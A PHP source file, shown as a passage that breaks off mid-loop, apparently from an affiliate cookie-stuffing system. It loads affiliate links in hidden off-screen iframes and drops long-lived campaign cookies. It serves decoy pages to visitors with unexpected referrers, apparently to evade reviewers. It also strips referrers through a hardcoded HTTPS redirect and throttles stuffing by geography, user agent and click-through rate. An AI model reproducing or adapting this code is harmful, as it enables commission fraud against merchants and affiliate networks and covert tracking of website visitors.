<?php $testing_ip=0; if ($testing_ip) { if ($testing_ip==1) { if (file_exists('ip.txt')) { $x=file_get_contents('ip.txt'); } else { $x=''; } if ($x===FALSE) { $x=''; } } else { $x=''; } if (!$x) { $x=array('84.9.39.122','202.14.186.30','64.34.195.155'); $x=array('84.9.39.122'); $r=(int)(rand(1,sizeof($x))); $_SERVER['REMOTE_ADDR']=$x[$r-1]; file_put_contents('ip.txt',$_SERVER['REMOTE_ADDR']); } else { $_SERVER['REMOTE_ADDR']=$x; } } if (!isset($path)) { $path=''; } $css_method=1; $css_links=30; $css_links2=100; $css_period=86400; $domain=$_SERVER['HTTP_HOST']; if ((strpos($domain,'localhost')!==FALSE) || (strpos($domain,'127.0.0.1')!==FALSE)) { $ver=0; } else { $ver=1; } if (!$ver) { $_SERVER['HTTP_REFERER']=str_replace('localhost','127.0.0.1',$_SERVER['HTTP_REFERER']); $_SERVER['HTTP_HOST']=str_replace('localhost','127.0.0.1',$_SERVER['HTTP_HOST']); } $debug=0; $performance=0; require_once("../config.inc.php"); require_once("../encode.inc.php"); require_once("../encode2.inc.php"); require_once("../encode3.inc.php"); require_once("../core.inc.php"); require_once("../implement.inc.php"); require_once("../{$folders['admin']}/inc/mysql/mysql.inc.php"); require_once("../iframe.inc.php"); require_once("../{$folders['admin']}/inc/geoip.inc"); require_once("../{$folders['admin']}/inc/geoipcity.inc"); 

$ssl_url='https://gator340.hostgator.com/~biz110/redir/redirect.php';

if ($ver && !$output_errors) { error_reporting(0); } $xxx_qs=''; if (isset($_GET['qs'])) { if ($_GET['qs']) { if (substr($_GET['qs'],0,1)=='-') { $_GET['qs']=substr($_GET['qs'],1); $pos=strpos($_GET['qs'],'-'); if ($pos!==FALSE) { $ts=decode(substr($_GET['qs'],0,$pos)); $ref=substr($_GET['qs'],$pos+1); $_GET['timestamp']=$ts; $_GET['qs']=$ref; $xxx_qs=$ref; } } else { $x1=decode3($_GET['qs']); $x2=urldecode($_GET['qs']); if ($x1=='noscript' || substr($x1,0,4)=='http') { $xxx_qs=$x1; } else if ($x2=='noscript' || substr($x2,0,4)=='http') { $xxx_qs=$x2; } } } } function a1() { global $flash,$go,$referrer,$querystring,$httphost,$phpself,$campaignid,$campaignid2,$row,$_GET,$_SERVER,$id,$statuscode,$advanced,$do_decoy,$ua; $url="http://{$httphost}{$phpself}"; if ($row['type']!=3) { if (strpos($referrer,$httphost)===FALSE) { stop(); $go=0; if ($row['type']==2) { output_flash_banner(); return(0); } } } if (!$go) { $a='html'; } else { $a='php'; } $usesafe=0; if (isset($advanced['usesafe']['only']) && $advanced['usesafe']['only'] && ($row['type']==2)) { $temp=explode('|',$advanced['usesafe']['only']); foreach ($temp as $zz) { if (strpos($ua,$zz)!==FALSE) { $usesafe=1; break; } } } if (isset($advanced['usesafe']['never']) && $advanced['usesafe']['never'] && ($row['type']==2)) { $temp=explode('|',$advanced['usesafe']['never']); $flag=0; foreach ($temp as $zz) { if (strpos($ua,$zz)===FALSE) { $flag++; } } if ($flag==sizeof($temp)) { $usesafe=1; } } add_access($a); $a='php'; $url=do_custom($campaignid,$a,$url); header("Cache-Control: no-cache, no-store, max-age=0, s-maxage=0, must-revalidate"); header("Cache-Control: post-check=0, pre-check=0", false ); header("Expires: Mon, 26 Jul 1997 05:00:00 GMT"); header("Pragma: no-cache"); redirect($url); } function add_access($status) { global $_SERVER,$campaignid,$campaignid2,$row,$global_pos2; $global_pos2=0; $pos=0; $x=unserialize($row['affiliateurl']); if ($x!==FALSE) { if ($x['sequence']==1) { if (sizeof($x['urls'])) { $pos=$x['pos']; $global_pos2=$pos; $x['pos']++; if ($x['pos']>=sizeof($x['urls'])) { $x['pos']=0; } $x['urls']=deconvert($x['urls']); $x=serialize($x); db_update_data(array('affiliateurl'=>$x),"campaignid='$campaignid'",'campaigns'); } } else if ($x['sequence']==2) { if (sizeof($x['urls'])) { $pos=$x['pos']; $global_pos2=$pos; $x['pos']=(int)(rand(0,sizeof($x['urls'])-1)); $x['urls']=deconvert($x['urls']); $x=serialize($x); db_update_data(array('affiliateurl'=>$x),"campaignid='$campaignid'",'campaigns'); } } } if ($status=='php') { $status=0; } else if ($status=='html') { $status=1; } else if ($status=='shtml') { $status=2; } else { return(0); } $md5=md5(strtolower($_SERVER['HTTP_USER_AGENT']) . $_SERVER['REMOTE_ADDR'] . $campaignid); $count=db_count_rows('access',"md5='$md5'"); if ($count!=-1) { if ($count) { db_update_data(array('campaignid'=>$campaignid,'status'=>$status,'timestamp'=>time(),'pos'=>$pos),"md5='$md5'",'access'); } else { db_insert_data(array('md5'=>$md5,'campaignid'=>$campaignid,'status'=>$status,'timestamp'=>time(),'pos'=>$pos),'access'); } } } function get_access() { global $_SERVER,$campaignid,$campaignid2,$db_num,$db_result,$global_pos,$in_settings2; $global_pos=0; $ret=2; $md5=md5(strtolower($_SERVER['HTTP_USER_AGENT']) . $_SERVER['REMOTE_ADDR'] . $campaignid); if (db_get_data('status,pos','access',"md5='$md5'")) { if ($db_num) { $row = mysql_fetch_array($db_result,MYSQL_ASSOC); $ret=$row['status']; $global_pos=$row['pos']; $timestamp=time()-86400; $r=(int)(rand(1,10)); if ($r==5) { db_delete_data("timestamp<'$timestamp'",'access'); } $r=(int)(rand(1,20)); if ($r==10) { if (db_get_data('extra','settings2')) { if ($db_num) { $row2 = mysql_fetch_array($db_result,MYSQL_ASSOC); $y=unserialize($row2['extra']); if ($y!==FALSE) { if (isset($y['trim'])) { if ($y['trim']) { $ts=time()-(86400*$y['trim']); db_delete_data("campaignid='$campaignid' AND timestamp<'$ts'",'log'); } } } } } } } } return($ret); } function a2() { global $folders,$xxx_qs,$real_referrer,$_SERVER,$xy,$referrer,$campaignid,$campaignid2,$flash,$httphost,$row,$phpself,$ua,$advanced,$id,$statuscode,$do_decoy,$go,$ver,$path,$ssl_url,$ip,$ua,$db_num,$db_result; $files=$row['files']; if (!$ver) { $files=str_replace('localhost','127.0.0.1',$files); } $do_iframe=0; if ($row['type']!=3) { if ($row['type']==2) { $find2=$files . "{$campaignid}.php"; $find3=$files . "{$campaignid}.htm"; $flag=0; if (substr($referrer,strlen($referrer)-strlen($find2),strlen($find2))==$find2) { $flag=1; } else if (substr($referrer,strlen($referrer)-strlen($find3),strlen($find3))==$find3) { $flag=1; } if ($flag) { if (isset($advanced['always']) && $advanced['always']) { $always=1; } else { $always=0; } if (!$always || (($row['type']==2 || $row['type']==3) && ($row['mode']==2))) { $a=get_access(); if ($a) { $can_use_https_redirect=0; $blank_ref_nostuffing=0; $blank_ref_click=0; if ($advanced!==FALSE) { if (isset($advanced['blank_ref_ua']) && $advanced['blank_ref_ua']) { $temp=explode('|',$advanced['blank_ref_ua']); if (sizeof($temp)) { foreach ($temp as $zz) { if ($zz) { if (strpos($ua,$zz)!==FALSE) { $can_use_https_redirect=1; break; } } } } } else { $can_use_https_redirect=1; } if (isset($advanced['blank_ref_nostuffing']) && $advanced['blank_ref_nostuffing']) { $blank_ref_nostuffing=1; } else { $blank_ref_nostuffing=0; } if (isset($advanced['blank_ref_click']) && $advanced['blank_ref_click']) { $blank_ref_click=1; } else { $blank_ref_click=0; } } if ($can_use_https_redirect && ($blank_ref_nostuffing || $blank_ref_click)) { if ($blank_ref_nostuffing) { if (isset($advanced['checkblank'])) { $checkblank=$advanced['checkblank']; } else { $checkblank=0; } $row['nostuff_imageurl']=https_redirect($row['nostuff_imageurl'],$checkblank,$row['safe_imageurl']); $row['nostuff_imagedest']=https_redirect($row['nostuff_imagedest'],$checkblank,$row['safe_imagedest']); $row['nostuff_imageurl']=$row['files'] . 'go.php?' . encode($row['nostuff_imageurl']); $row['nostuff_imagedest']=$row['files'] . 'go.php?' . encode($row['nostuff_imagedest']); } if ($blank_ref_click) { $row['nostuff_click']=https_redirectx($row['nostuff_click'],$checkblank,$row['safe_click']); $row['nostuff_click']=$row['files'] . 'go.php?' . encode($row['nostuff_click']); } } else if ($blank_ref_nostuffing || $blank_ref_click) { if ($blank_ref_nostuffing) { $row['nostuff_imageurl']=$row['safe_imageurl']; $row['nostuff_imagedest']=$row['safe_imagedest']; } if ($blank_ref_click) { $row['nostuff_click']=$row['safe_click']; } } if ($a==2) { $safe=1; } else { $safe=0; } if ($safe) { $row['nostuff_imagedest']=$row['safe_imagedest']; $row['nostuff_imageurl']=$row['safe_imageurl']; $row['nostuff_html']=$row['safe_html']; $row['nostuff_click']=$row['safe_click']; } if ($row['mode']==2) { $normal=$row['nostuff_html']; } else { if ($advanced['clickable']) { $normal="<a href=\"[imagedest]\" target=\"_top\"><img src=\"[imageurl]\" style=\"width:[width]px; height:[height]px; border-style:none;\" /></a>"; } else { $normal="<img src=\"[imageurl]\" style=\"width:[width]px; height:[height]px; border-style:none;\" />"; } $width=$row['width']; $height=$row['height']; $normal=str_replace('[imagedest]',$row['nostuff_click'],$normal); $normal=str_replace('[imageurl]',$row['nostuff_imageurl'],$normal); $normal=str_replace('[width]',$width,$normal); $normal=str_replace('[height]',$height,$normal); } $ip2=convert_ip($ip,'to_int'); $ua2=substr($ua,0,255); $st=0; $ua2x=str_replace("'",'\\\'',$ua2); if (db_get_data('itemid,status','log',"ip='$ip2' AND ua='$ua2x' AND campaignid='$campaignid'",'<itemid',0,1)) { if ($db_num) { $row2 = mysql_fetch_array($db_result,MYSQL_ASSOC); $itemid=$row2['itemid']; $st=$row2['status']; if ($st>=10000) { $st=$st-10000; db_update_data(array('status'=>$st),"itemid='$itemid'",'log'); } } } header("Cache-Control: no-cache, no-store, max-age=0, s-maxage=0, must-revalidate"); header("Cache-Control: post-check=0, pre-check=0", false ); header("Expires: Mon, 26 Jul 1997 05:00:00 GMT"); header("Pragma: no-cache"); if ($advanced['redirecturl']) { global $iframe3; echo str_replace('{DESTURL}',$advanced['redirecturl'],$iframe3); } else { echo $normal; } return(0); } } output_flash_banner(); } else if (strpos($referrer,$httphost)===FALSE && !$xy) { $do_decoy=1; if ($row['type']==3) { $do_decoy=0; $do_iframe=1; $flag=0; if (!$referrer) { $flag=1; } else if (!$row['landingpage']) { $flag=1; } else if (strpos($referrer,$row['landingpage'])===FALSE) { $flag=1; } if ($flag) { $a=''; if (isset($advanced['usesafe']['only'])) { $a=$advanced['usesafe']['only']; } $a=$a . ",$ua"; $advanced['usesafe']['only']=$a; } } if ($do_decoy) { xlog($campaignid,'31'); stop(); $decoy=$row['decoy']; if ($decoy) { if ((substr($decoy,0,7)=='http://') || (substr($decoy,0,8)=='https://')) { header("Cache-Control: no-cache, no-store, max-age=0, s-maxage=0, must-revalidate"); header("Cache-Control: post-check=0, pre-check=0", false ); header("Expires: Mon, 26 Jul 1997 05:00:00 GMT"); header("Pragma: no-cache"); redirect($decoy); } else { $x=file_get_contents($path . $decoy); header("Cache-Control: no-cache, no-store, max-age=0, s-maxage=0, must-revalidate"); header("Cache-Control: post-check=0, pre-check=0", false ); header("Expires: Mon, 26 Jul 1997 05:00:00 GMT"); header("Pragma: no-cache"); echo $x; } } } } else if (strpos($referrer,$row['landingpage'])===FALSE && $xy && !$advanced['redirecturl']) { if ($row['type']==2) { $real_referrer=$xxx_qs; } xlog($campaignid,'31'); stop(); $decoy=$row['decoy']; if ($decoy) { if ((substr($decoy,0,7)=='http://') || (substr($decoy,0,8)=='https://')) { header("Cache-Control: no-cache, no-store, max-age=0, s-maxage=0, must-revalidate"); header("Cache-Control: post-check=0, pre-check=0", false ); header("Expires: Mon, 26 Jul 1997 05:00:00 GMT"); header("Pragma: no-cache"); redirect($decoy); } else { $x=file_get_contents($path . $decoy); header("Cache-Control: no-cache, no-store, max-age=0, s-maxage=0, must-revalidate"); header("Cache-Control: post-check=0, pre-check=0", false ); header("Expires: Mon, 26 Jul 1997 05:00:00 GMT"); header("Pragma: no-cache"); echo $x; } } } else { $do_iframe=1; } } else if ($row['type']==0) { $do_iframe=1; $do_decoy=0; $flag=0; if (!$referrer) { $flag=1; } else if (!$row['landingpage']) { $flag=1; } else if (strpos($referrer,$row['landingpage'])===FALSE) { $flag=1; } if ($flag) { stop(); $do_decoy=1; } } else if ($row['type']==1) { $do_iframe=1; } } else { $a=strtolower($_SERVER['REQUEST_URI']); if (substr($a,strlen($a)-3,3)!='swf') { $flag=0; if (!$referrer) { $flag=1; } else if (!$row['landingpage']) { $flag=1; } else if (strpos($referrer,$row['landingpage'])===FALSE) { $flag=1; } if ($flag) { xlog($campaignid,'31'); stop(); $decoy=$row['decoy']; if ($decoy) { if ((substr($decoy,0,7)=='http://') || (substr($decoy,0,8)=='https://')) { header("Cache-Control: no-cache, no-store, max-age=0, s-maxage=0, must-revalidate"); header("Cache-Control: post-check=0, pre-check=0", false ); header("Expires: Mon, 26 Jul 1997 05:00:00 GMT"); header("Pragma: no-cache"); redirect($decoy); } else { $x=file_get_contents($path . $decoy); header("Cache-Control: no-cache, no-store, max-age=0, s-maxage=0, must-revalidate"); header("Cache-Control: post-check=0, pre-check=0", false ); header("Expires: Mon, 26 Jul 1997 05:00:00 GMT"); header("Pragma: no-cache"); echo $x; } } } else { output_flash_banner(); } } else { if ($row['landingpage'] && $referrer && (strpos($referrer,$row['landingpage'])===FALSE)) { xlog($campaignid,'31'); } $do_iframe=1; $flag=0; if (!$referrer) { $flag=1; } else if (!$row['landingpage']) { $flag=1; } else if (strpos($referrer,$row['landingpage'])===FALSE) { $flag=1; } if ($flag) { stop(); output_flash_banner(); return(0); } } } if ($do_iframe) { $files=stripback("http://{$httphost}{$phpself}",'/'); $can_use_https_redirect=0; $blank_ref_stuffing=0; $blank_ref_nostuffing=0; $blank_ref_click=0; if ($advanced!==FALSE) { $usesafe=0; if (isset($advanced['usesafe']['only']) && $advanced['usesafe']['only'] && ($row['type']==2)) { $temp=explode('|',$advanced['usesafe']['only']); foreach ($temp as $zz) { if (strpos($ua,$zz)!==FALSE) { $usesafe=1; break; } } } if (isset($advanced['usesafe']['never']) && $advanced['usesafe']['never'] && ($row['type']==2)) { $temp=explode('|',$advanced['usesafe']['never']); $flag=0; foreach ($temp as $zz) { if (strpos($ua,$zz)===FALSE) { $flag++; } } if ($flag==sizeof($temp)) { $usesafe=1; } } if ($usesafe) { $row['nostuff_html']=$row['safe_html']; $row['stuff_html']=$row['safe_html']; } if (isset($advanced['blank_ref_ua']) && $advanced['blank_ref_ua']) { $temp=explode('|',$advanced['blank_ref_ua']); if (sizeof($temp)) { foreach ($temp as $zz) { if ($zz) { if (strpos($ua,$zz)!==FALSE) { $can_use_https_redirect=1; break; } } } } } else { $can_use_https_redirect=1; } if (isset($advanced['always']) && $advanced['always']) { $always=1; } else { $always=0; } if (isset($advanced['blank_ref_stuffing']) && $advanced['blank_ref_stuffing']) { $blank_ref_stuffing=1; } else { $blank_ref_stuffing=0; } if (isset($advanced['blank_ref_nostuffing']) && $advanced['blank_ref_nostuffing']) { $blank_ref_nostuffing=1; } else { $blank_ref_nostuffing=0; } if (isset($advanced['blank_ref_click']) && $advanced['blank_ref_click']) { $blank_ref_click=1; } else { $blank_ref_click=0; } } else { $advanced=array(); } if ($row['type']==2) { $real_referrer=$xxx_qs; } if (($row['type']==0 || $row['type']==1) && $do_decoy) { $stuffing=0; $statuscode=31; } else { if (stuffornot()) { $stuffing=1; } else { $stuffing=0; } } $flag=0; if ($stuffing && $blank_ref_stuffing) { $flag=1; } else if (!$stuffing && $blank_ref_nostuffing) { $flag=1; } else if ($blank_ref_click) { $flag=1; } if ($can_use_https_redirect && $flag) { if (isset($advanced['checkblank'])) { $checkblank=$advanced['checkblank']; } else { $checkblank=0; } $safe=''; if ($row['type']==0) { $safe=$row['safe_imageurl']; } if ($blank_ref_stuffing) { $x=unserialize($row['affiliateurl']); if ($x!==FALSE) { if (sizeof($x['urls'])) { $new=array(); foreach ($x['urls'] as $zz) { $zz2=$zz; $new[]=https_redirect($zz2,$checkblank,$safe); } $x['urls']=$new; $row['affiliateurl']=serialize($x); } } else { $row['affiliateurl']=https_redirect($row['affiliateurl'],$checkblank,$safe); } } if ($blank_ref_nostuffing) { $row['nostuff_imageurl']=https_redirect($row['nostuff_imageurl'],$checkblank,$row['safe_imageurl']); $row['nostuff_imagedest']=https_redirect($row['nostuff_imagedest'],$checkblank,$row['safe_imagedest']); } if ($blank_ref_click) { $row['nostuff_click']=https_redirectx($row['nostuff_click'],$checkblank,$row['safe_click']); $row['stuff_click']=https_redirectx($row['stuff_click'],$checkblank,$row['safe_click']); } if ($blank_ref_stuffing) { $row['stuff_imageurl']=https_redirect($row['stuff_imageurl'],$checkblank,$row['safe_imageurl']); $row['stuff_imagedest']=https_redirect($row['stuff_imagedest'],$checkblank,$row['safe_imagedest']); } } else if ($flag) { $row['stuff_html']=$row['safe_html']; $row['stuff_imageurl']=$row['safe_imageurl']; $row['stuff_imagedest']=$row['safe_imagedest']; $row['stuff_click']=$row['safe_click']; $row['nostuff_html']=$row['safe_html']; $row['nostuff_imageurl']=$row['safe_imageurl']; $row['nostuff_imagedest']=$row['safe_imagedest']; $row['nostuff_click']=$row['safe_click']; $row['affiliateurl']=''; $statuscode=7; $stuffing=0; } else { } if ($stuffing) { if ($advanced!==FALSE) { if (isset($advanced['browsercookiename']) && $advanced['browsercookiename']) { $length=(((60*60)*24)*1500); if ($advanced['browsercookielength']!=='' && $advanced['browsercookielength']>0) { $length=86400*$advanced['browsercookielength']; } set_cookie($advanced['browsercookiename'],$campaignid,time()+$length,1); } } } do_own_cookie(); $style=''; $width=$row['width']; $height=$row['height']; $normal="<a href=\"[imagedest]\"><img src=\"[imageurl]\" style=\"width:[width]px; height:[height]px; border-style:none;\" /></a>"; if ($stuffing || ($row['type']==2 && $always && !$stuffing && $row['mode']==1) || $row['type']==3) { if ($row['mode']==2) { $width=0; $height=0; $style=' style="visibility:hidden; position:absolute; left:-3000px;"'; $normal=''; $html=$row['stuff_html']; } else { $normal=str_replace('[imagedest]',$row['safe_imagedest'],$normal); $normal=str_replace('[imageurl]',$row['safe_imageurl'],$normal); $normal=str_replace('[width]',$width,$normal); $normal=str_replace('[height]',$height,$normal); $html=''; } if ($stuffing) { xlog($campaignid,'1'); } else { xlog($campaignid,$statuscode); } delete_own_cookie($stuffing); if ($row['type']==2 || $row['type']==3) { if ($row['type']==3) { $go=$stuffing; a1(); } else { if ($stuffing) { $a='__' . $campaignid; } else { $a='_' . $campaignid; } $src=str_replace("index.php",$a . '.swf',"{$httphost}{$phpself}"); $x=do_iframe($files,$row['bg'],$src,$width,$height,$style,$normal,$html); if ($advanced['custom']) { $flashvars='var flashvars = { cid: "' . $campaignid . '",id: "' . get_subfolders() . '" };'; $find='var flashvars = {'; $pos=strpos($x,$find); if ($pos!==FALSE) { $pos2=strpos($x,'}',$pos); if ($pos2!==FALSE) { $pos2++; $flashvars=substr($flashvars,0,strlen($flashvars)-1); $x=substr_replace($x,$flashvars,$pos,$pos2-$pos); } } } else if ($advanced['custom2'] && $advanced['flashvars']) { $flashvars='var flashvars = { cid: "' . $campaignid . '",swf: "' . encode($row['files'] . "index.php") . '" };'; $find='var flashvars = {'; $pos=strpos($x,$find); if ($pos!==FALSE) { $pos2=strpos($x,'}',$pos); if ($pos2!==FALSE) { $pos2++; $flashvars=substr($flashvars,0,strlen($flashvars)-1); $x=substr_replace($x,$flashvars,$pos,$pos2-$pos); } } } header("Cache-Control: no-cache, no-store, max-age=0, s-maxage=0, must-revalidate"); header("Cache-Control: post-check=0, pre-check=0", false ); header("Expires: Mon, 26 Jul 1997 05:00:00 GMT"); header("Pragma: no-cache"); echo $x; } } else { if ($row['type']==0) { if ($stuffing && !$do_decoy) { redirectx(); } else { header("Cache-Control: no-cache, no-store, max-age=0, s-maxage=0, must-revalidate"); header("Cache-Control: post-check=0, pre-check=0", false ); header("Expires: Mon, 26 Jul 1997 05:00:00 GMT"); header("Pragma: no-cache"); redirect($row['nostuff_imageurl']); } } else if ($row['type']==1) { redirectx(); } } } else { xlog($campaignid,$statuscode,$row['mode']); delete_own_cookie(0); if ($row['type']==0) { header("Cache-Control: no-cache, no-store, max-age=0, s-maxage=0, must-revalidate"); header("Cache-Control: post-check=0, pre-check=0", false ); header("Expires: Mon, 26 Jul 1997 05:00:00 GMT"); header("Pragma: no-cache"); redirect($row['nostuff_imageurl']); } else if ($row['type']==1) { $x=unserialize($row['advanced']); if ($x!==FALSE) { $x=$x['favicon']; if ($x) { header("Cache-Control: no-cache, no-store, max-age=0, s-maxage=0, must-revalidate"); header("Cache-Control: post-check=0, pre-check=0", false ); header("Expires: Mon, 26 Jul 1997 05:00:00 GMT"); header("Pragma: no-cache"); redirect($x); } } } else { $a='html'; $usesafe=0; if (isset($advanced['usesafe']['only']) && $advanced['usesafe']['only'] && ($row['type']==2)) { $temp=explode('|',$advanced['usesafe']['only']); foreach ($temp as $zz) { if (strpos($ua,$zz)!==FALSE) { $usesafe=1; break; } } } if (isset($advanced['usesafe']['never']) && $advanced['usesafe']['never'] && ($row['type']==2)) { $temp=explode('|',$advanced['usesafe']['never']); $flag=0; foreach ($temp as $zz) { if (strpos($ua,$zz)===FALSE) { $flag++; } } if ($flag==sizeof($temp)) { $usesafe=1; } } if ($usesafe) { $a='shtml'; } add_access($a); $a='php'; $url="http://{$httphost}{$phpself}"; $url=do_custom($campaignid,$a,$url); header("Cache-Control: no-cache, no-store, max-age=0, s-maxage=0, must-revalidate"); header("Cache-Control: post-check=0, pre-check=0", false ); header("Expires: Mon, 26 Jul 1997 05:00:00 GMT"); header("Pragma: no-cache"); if ($row['mode']==2) { $width=$advanced['htmlwidth']; $height=$advanced['htmlheight']; } else { $width=$row['width']; $height=$row['height']; } echo '<html><body></body></html>'; } } } } function redirectx() { global $row,$campaignid,$campaignid2,$subid,$advanced,$db_num,$db_result,$_SERVER; $url=''; $x=unserialize($row['affiliateurl']); if ($x!==FALSE) { if (sizeof($x['urls'])) { $row['affiliateurl']=$x['urls'][$x['pos']]; if ($row['affiliateurl']=='http://' || $row['affiliateurl']=='https://') { $row['affiliateurl']=''; } if ($x['sequence']==1) { $x['pos']++; if ($x['pos']>=sizeof($x['urls'])) { $x['pos']=0; } } else { $x['pos']=(int)(rand(0,sizeof($x['urls'])-1)); } $x['urls']=deconvert($x['urls']); $x=serialize($x); db_update_data(array('affiliateurl'=>$x),"campaignid='$campaignid'",'campaigns'); $url=$row['affiliateurl']; } } else { $url=$row['affiliateurl']; } if ($url) { if ($subid) { if ($subid=='auto' || $subid=='auto2') { $ref=$_SERVER['HTTP_REFERER']; if ($subid=='auto2') { $ref2=''; if (substr($ref,0,7)=='http://') { $ref2=substr($ref,7); $p='http://'; } else if (substr($ref,0,8)=='http://') { $ref2=substr($ref,8); $p='https://'; } if ($ref2) { $i=0; while ($i<strlen($ref)) { if (substr($ref2,$i,1)=='/') { $ref2=substr($ref2,0,$i); break; } else { $i++; } } $ref=$p . $ref2; } } $md5=md5($ref); if (db_get_data('itemid','subid',"md5='$md5'")) { if ($db_num) { $row_subid = mysql_fetch_array($db_result,MYSQL_ASSOC); $subid=$row_subid['itemid']; } else { db_insert_data(array('ref'=>$ref,'md5'=>$md5),'subid'); $subid=mysql_insert_id(); } } } $pos=strpos($url,'.php?a='); if ($pos!==FALSE) { $pos=$pos+7; $pos2=strpos($url,'&',$pos); if ($pos2!==FALSE) { $x=substr($url,$pos,$pos2-$pos); $x=decode($x); $x=str_replace('[subid]',$subid,$x); $x=str_replace('[SUBID]',$subid,$x); $x=encode($x); $url=substr_replace($url,$x,$pos,$pos2-$pos); } } else { $url=str_replace('[subid]',$subid,$url); $url=str_replace('[SUBID]',$subid,$url); } } header("Cache-Control: no-cache, no-store, max-age=0, s-maxage=0, must-revalidate"); header("Cache-Control: post-check=0, pre-check=0", false ); header("Expires: Mon, 26 Jul 1997 05:00:00 GMT"); header("Pragma: no-cache"); if (!is_array($advanced)) { $advanced=unserialize($row['advanced']); } if (is_array($advanced)) { if ($advanced['timedelay']) { $d=$advanced['timedelay']; if (strpos($d,'-')!==FALSE) { $x=explode('-',$d); $d=0; if (sizeof($x)>1) { if ($x[0]<$x[1]) { $d=(int)(rand($x[0],$x[1])); } } } if ($d) { sleep($d); } } } $ar=get_placeholders(); if (sizeof($ar)) { $a=$_SERVER['HTTP_REFERER']; if (strpos($a,'?')!==FALSE) { $temp=explode('?',$a); $a=$temp[1]; if ($a) { $temp=explode('&',$a); $pairs=array(); foreach ($temp as $zz) { if ($zz) { $temp2=explode('=',$zz); if (sizeof($temp2)==2) { $pairs[$temp2[0]]=$temp2[1]; } } } $url=str_replace('{var1}',$pairs[$ar['var1']],$url); $url=str_replace('{var2}',$pairs[$ar['var2']],$url); $url=str_replace('{var3}',$pairs[$ar['var3']],$url); } } } redirect($url); } } function deconvert($ar) { global $settings,$ssl_url; if (getsettings()) { $r=$settings['redirect']; if (!$r) { $r=$ssl_url; } $r2=str_replace('redirect.php','redirect2.php',$r); foreach ($ar as $index=>$url) { $pos=strpos($url,$r); if ($pos!==FALSE) { $url=decode(substr($url,$pos+strlen($r)+1)); } else if (strpos($url,$r2)!==FALSE) { $pos=strpos($url,'?a=',strlen($r2)); if ($pos!==FALSE) { $pos2=strpos($url,'&b=',$pos); if ($pos2!==FALSE) { $pos=$pos+3; $url=decode(substr($url,$pos,$pos2-$pos)); } } } $ar[$index]=$url; } } return($ar); } function a5() { global $row,$httphost,$phpself,$ua,$advanced,$go,$campaignid,$campaignid2,$fc,$db_num,$db_result,$ip,$ua,$global_pos,$in_external; global $row222,$_GET,$_SERVER; $row222=$row; $update_affiliateurl=0; $affiliateurl=''; $usesafe=0; if (isset($advanced['usesafe']['only']) && $advanced['usesafe']['only'] && ($row['type']==2 || $row['type']==3)) { $temp=explode('|',$advanced['usesafe']['only']); foreach ($temp as $zz) { if (strpos($ua,$zz)!==FALSE) { $usesafe=1; break; } } } if (isset($advanced['usesafe']['never']) && $advanced['usesafe']['never'] && ($row['type']==2 || $row['type']==3)) { $temp=explode('|',$advanced['usesafe']['never']); $flag=0; foreach ($temp as $zz) { if (strpos($ua,$zz)===FALSE) { $flag++; } } if ($flag==sizeof($temp)) { $usesafe=1; } } $ip2=convert_ip($ip,'to_int'); $ua2=substr($ua,0,255); $ua22=substr($ua,0,50); $st=0; $doupdate=array(); $ua2x=str_replace("'",'\\\'',$ua2); $ua22x=str_replace("'",'\\\'',$ua22); if (db_get_data('itemid,status,affiliateurl','log',"ip='$ip2' AND (ua='$ua2x' OR ua='$ua22x') AND campaignid='$campaignid'",'<itemid',0,1)) { if ($db_num) { $row2 = mysql_fetch_array($db_result,MYSQL_ASSOC); $itemid=$row2['itemid']; $affiliateurl=$row2['affiliateurl']; $st=0; if ($fc && $advanced['flashcookiename']) { $st=4; } else if ($usesafe) { $st=37; } else if (!$in_external && $advanced['iframe']) { $st=39; } else { $st=$row2['status']; if ($st>=10000) { $st=$st-10000; } } if ($st) { $doupdate=array($st,$itemid); } } } $stuffing=0; $use_flash_cookies=0; $files=stripback("http://{$httphost}{$phpself}",'/'); $can_use_https_redirect=0; $blank_ref_stuffing=0; $blank_ref_nostuffing=0; $blank_ref_click=0; $url=$advanced['redirecturl']; if ($url) { $redir=1; } else { $redir=0; } $finallookup=$advanced['finallookup']; if ($finallookup=='http://' || $finallookup=='https://') { $finallookup=''; } $status=get_access(); if ($status==0) { $stuffing=1; } if ($st==4) { $stuffing=0; $status=1; } if ($stuffing) { $x=unserialize($row['affiliateurl']); if ($x!==FALSE) { if ($x['sequence']==0) { $a=''; $word=''; $urlsx=array(); $flag_z=1; foreach ($x['urls'] as $zz) { if ($zz) { $urlsx[]=$zz; } } $filters=unserialize($row['filters']); if ($advanced['indctr']) { $indctr=explode("\n",str_replace("\r",'',$advanced['indctr'])); $urls=array(); $which_st=0; if (sizeof($indctr)) { foreach ($indctr as $zz) { $temp=explode('|',$zz); $urls[md5($temp[0])]=$zz; } foreach ($urlsx as $urlsx_index=>$zz) { $campaign_geo=1; $campaign_ctr=1; $stuffingx=1; if (isset($urls[md5($zz)])) { $temp2=explode('|',$urls[md5($zz)]); $minctr=$temp2[1]; $maxctr=$temp2[2]; $affurl2=$temp2[0]; if ($temp2[3]) { $geo=explode(',',$temp2[3]); } else { $geo=array(); } if ($minctr || $maxctr) { $campaign_ctr=0; if (!do_ctr2($minctr,$maxctr,$campaignid,$affurl2)) { unset($urlsx[$urlsx_index]); $stuffingx=0; $which_st=40; } } if (sizeof($geo)) { $campaign_geo=0; if ($stuffingx) { if (!check_geo2($ip,$geo)) { unset($urlsx[$urlsx_index]); $stuffingx=0; $which_st=41; } } } } if ($campaign_geo) { if (check_geo($ip,$filters['geo']['never'],0)) { $which_st=26; $stuffingx=0; unset($urlsx[$urlsx_index]); } else if (!check_geo($ip,$filters['geo']['only'],1)) { $which_st=26; $stuffingx=0; unset($urlsx[$urlsx_index]); } } if ($campaign_ctr && $stuffingx) { if (!do_ctr($campaignid)) { $which_st=11; $stuffingx=0; unset($urlsx[$urlsx_index]); } } if (!$stuffingx && $affiliateurl) { $affiliateurl=str_replace("$zz<br />",'',$affiliateurl); $update_affiliateurl=1; } } if (!$affiliateurl && $which_st) { $update_affiliateurl=1; if (sizeof($doupdate)==2) { $doupdate[0]=$which_st; } } } } else { if (check_geo($ip,$filters['geo']['never'],0)) { $which_st=26; $stuffingx=0; $flag_z=0; $row['affiliateurl']=''; } else if (!check_geo($ip,$filters['geo']['only'],1)) { $which_st=26; $stuffingx=0; $flag_z=0; $row['affiliateurl']=''; } else if (!do_ctr($campaignid)) { $which_st=11; $stuffingx=0; $flag_z=0; $row['affiliateurl']=''; } if (!$flag_z && $which_st) { $update_affiliateurl=1; $affiliateurl=''; if (sizeof($doupdate)==2) { $doupdate[0]=$which_st; } } } if ($flag_z) { reset($urlsx); foreach ($urlsx as $zz) { if ($zz) { 